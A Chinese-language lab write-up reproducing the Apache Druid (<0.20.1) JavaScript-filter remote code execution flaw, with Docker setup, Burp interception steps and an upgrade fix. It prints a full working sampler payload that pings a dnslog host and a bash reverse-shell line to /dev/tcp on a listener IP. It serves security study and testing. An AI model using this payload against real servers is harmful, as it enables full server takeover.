## **0x** **00** **简介**

Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid
最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。 另外，Druid
还有一个关键的特点：它支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中用到它。

  

##  **0x** **0** **1漏洞概述**

在Druid 0.20.0及更低版本中，用户发送恶意请求，利用Apache
Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。

##  **0x** **0** **2影响版本**

Apache Druid < 0.20.1

##  **0x** **0** **3环境搭建**

1、本次环境使用docker搭建，需要在虚拟机安装docker，安装完成后使用以下命令pull漏洞环境

 **docker pull fokkodriesprong/docker-druid**

![1616395112_60583b68445461ec19c50.png!small?1616395112380](https://image.3001.net/images/20210322/1616395112_60583b68445461ec19c50.png!small?1616395112380)

2、下载漏洞环境后使用以下命令启动漏洞环境

 **docker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid**

![1616395108_60583b64370c8fb97282f.png!small?1616395108308](https://image.3001.net/images/20210322/1616395108_60583b64370c8fb97282f.png!small?1616395108308)

3、启动后在浏览器访问http://your-ip:8888/看到以下界面表示成功

![1616395100_60583b5c1760c2db8c48c.png!small?1616395100010](https://image.3001.net/images/20210322/1616395100_60583b5c1760c2db8c48c.png!small?1616395100010)

##  **0x** **0** **4漏洞复现**

1、在浏览器进入Apache Druid首页如何点击点击左上方Load data -> Local disk按钮

![1616395116_60583b6c018e69535f1b0.png!small?1616395116019](https://image.3001.net/images/20210322/1616395116_60583b6c018e69535f1b0.png!small?1616395116019)

2、右侧表单填入Base directory:（quickstart/tutorial/）File filter:

（wikiticker-2015-09-12-sampled.json.gz）填入完成点击Preview，然后点击next

![1616395121_60583b71b2bbc6bf66ab5.png!small?1616395121920](https://image.3001.net/images/20210322/1616395121_60583b71b2bbc6bf66ab5.png!small?1616395121920)

3、打开burp并配置代理，然后一直点击next，直到下一步是Next：Filter时，抓取数据包

![1616395125_60583b75ea6f8e2d79cef.png!small?1616395126047](https://image.3001.net/images/20210322/1616395125_60583b75ea6f8e2d79cef.png!small?1616395126047)

![1616395129_60583b79162866d16b9c9.png!small?1616395129075](https://image.3001.net/images/20210322/1616395129_60583b79162866d16b9c9.png!small?1616395129075)

4、然后替换数据包中的data数据为以下代码，然后修改代码中的dnslog地址为自己的，点击发送，查看dnslog是否有数据

>
> {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
>
> "function":"function(value){return java.lang.Runtime.getRuntime().exec('ping
> kujqmk.dnslog.cn -c 1')}",
>
> "dimension":"added",
>
> "":{
>
> "enabled":"true"
>
> }
>
>
> }}}},"samplerConfig":{"numRows":500,"timeoutMs":15000,"cacheKey":"4ddb48fdbad7406084e37a1b80100214"}}

![1616395133_60583b7d63b168b0d545c.png!small?1616395133485](https://image.3001.net/images/20210322/1616395133_60583b7d63b168b0d545c.png!small?1616395133485)

![1616395137_60583b81665a33ccc4cd3.png!small?1616395137379](https://image.3001.net/images/20210322/1616395137_60583b81665a33ccc4cd3.png!small?1616395137379)

5、修改dnslog地址为反弹shell的payload，在kali中设置监听，可以看到成功反弹shell

exec('/bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.16.1.132/8896 0>&1')

![1616395140_60583b84d2f2aaf7ab67e.png!small?1616395140745](https://image.3001.net/images/20210322/1616395140_60583b84d2f2aaf7ab67e.png!small?1616395140745)

![1616395144_60583b880459ffe484144.png!small?1616395143937](https://image.3001.net/images/20210322/1616395144_60583b880459ffe484144.png!small?1616395143937)

##  **0x** **0** **5修复建议**

1、升级到最新版Apache Druid，下载地址为

https://druid.apache.org/downloads.html

